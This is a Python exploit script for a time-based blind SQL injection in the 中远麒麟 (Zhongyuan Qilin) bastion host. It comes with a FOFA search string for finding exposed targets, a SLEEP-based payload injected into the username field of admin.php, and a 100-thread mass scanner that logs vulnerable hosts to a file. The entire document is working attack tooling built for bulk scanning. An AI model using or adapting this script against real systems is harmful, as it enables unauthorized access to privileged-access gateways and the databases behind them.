#中远麒麟堡垒机SQL注入漏洞
#fofa:body="url=\"admin.php?controller=admin_index&action=get_user_login_fristauth&username="

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝                                                                                                                                                                                  
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="中远麒麟堡垒机SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/admin.php?controller=admin_commonuser"    
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;WOW64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.114Safari/537.36',
        'Connection':'close',
        'Content-Length':'78',
        'Accept':'*/*',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip',             
    }
    data1 = "username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    data2 = "username=admin"

    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data1,verify=False,proxies=proxies)
        res2 = requests.post(url=target+payload,headers=headers,data=data2,verify=False,proxies=proxies)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1-time2>=4:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()